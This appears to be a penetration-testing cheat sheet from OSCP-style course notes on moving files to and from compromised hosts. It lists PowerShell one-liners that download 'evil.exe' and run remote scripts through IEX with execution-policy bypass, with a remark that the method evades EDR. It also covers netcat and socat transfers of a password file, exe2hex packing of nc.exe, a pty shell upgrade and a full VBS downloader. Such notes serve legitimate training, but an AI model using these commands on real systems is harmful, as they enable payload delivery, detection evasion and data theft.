### Using third-party file sharing links
https://www.file.io/

### Powershell
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')" 
powershell -NoProfile -ExecutionPolicy Bypass -NoLogo -NonInteractive -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

d_f.ps1
$webclient = New-Object System.Net.WebClient
$url = "http://10.11.0.4/evil.exe"
$file = "path\new.exe"
$webclient.DownloadFile($url,$file)
PS:IEX (New-Object System.Net.WebClient).DownloadString('path/d_f.ps1') -- Cant be detected by EDR
```
```
upx -9 nc.exe(compress to be smaller)
exe2hex -x nc.exe -p nc.cmd(convert the file to hex and instruct powershell.exe to assemble it back into binary)
```

### SCP Copy file from remote machine to local tmp
scp john@localhost:/var/tmp/CopyMe.txt /tmp  
scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2  
scp -P 2222 student@192.168.79.112:/usr/share/kali-defaults/web/img/password.png /home/kali/

### NC transfering files
```
nc -lvnp 6666 > incoming.txt
nc -nv 192.168.65.61 6666 < incoming.txt
```

### Socat transfer files
```
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt  
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

### Pure-ftpd (Linux - Linux)
#### install
sudo apt update && sudo apt install pure-ftpd  
sudo groupadd ftpgroup  
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
sudo pure-pw useradd offsec -u kali -d /ftphome  
sudo pure-pw mkdb  
cd /etc/pure-ftpd/auth/  
sudo ln -s ../conf/PureDB 60pdb  
sudo mkdir -p /ftphome  
sudo chown -R ftpuser:ftpgroup /ftphome/  
sudo systemctl restart pure-ftpd  
#### connect
ftp 10.11.0.4  
bye  
#### Upgrading a Non-Interactive Shell
python -c 'import pty; pty.spawn("/bin/bash")'  
#### mode
bin(binary mode)
ascii(ascii mode)
#### transfer files
```
Authentication first
1. attack machine put files under ftphome dir
2. get filename/put filename
```

### vbs
usage: cscript wget.vbs http://10.11.0.4/evil.exe evil.exe(outfile)
```
strUrl = WScript.Arguments.Item(0)
StrFile = WScript.Arguments.Item(1) 
Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 
Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 
Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 
Const HTTPREQUEST_PROXYSETTING_PROXY = 2 
Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts 
 Err.Clear 
 Set http = Nothing 
 Set http = CreateObject("WinHttp.WinHttpRequest.5.1") 
 If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") 
 If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") 
 If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") 
 http.Open "GET", strURL, False 
 http.Send 
 varByteArray = http.ResponseBody 
 Set http = Nothing 
 Set fs = CreateObject("Scripting.FileSystemObject") 
 Set ts = fs.CreateTextFile(StrFile, True) 
 strData = "" 
 strBuffer = "" 
 For lngCounter = 0 to UBound(varByteArray) 
 ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) 
 Next 
 ts.Close
```
